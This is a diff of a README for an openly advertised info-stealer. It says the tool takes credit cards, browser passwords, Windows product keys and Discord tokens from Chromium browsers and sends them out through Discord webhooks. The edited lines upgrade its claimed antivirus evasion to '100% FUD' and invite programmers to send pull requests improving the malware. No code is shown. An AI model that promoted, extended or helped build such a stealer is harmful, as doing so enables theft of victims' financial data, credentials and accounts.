@@ -6,11 +6,14 @@
 ---------------------------------------------------
 >> utilizes discord's webhooks > sends passwords in a .zip, and token in chat
 
->> supports majority of chromium based browsers, is definitely open to improvement
+>> supports majority of chromium based browsers, is definitely open to improvement : (if you know how to do so, open a pull request with your code!)
 
->> mostly FUD, not 100%
+>> basically : 100% FUD 
 
 >> steals : credit cards, passwords, windows product key, & Discord token
+
+>> expert programmers: i give you permission to re-write this : if you can make everything be sent in one single, neat embed. 👍
+
 ---------------------------------------------------
 ## SCREENSHOT :
 ![](https://cdn.discordapp.com/attachments/796598097986715668/797299038536990760/example.png)
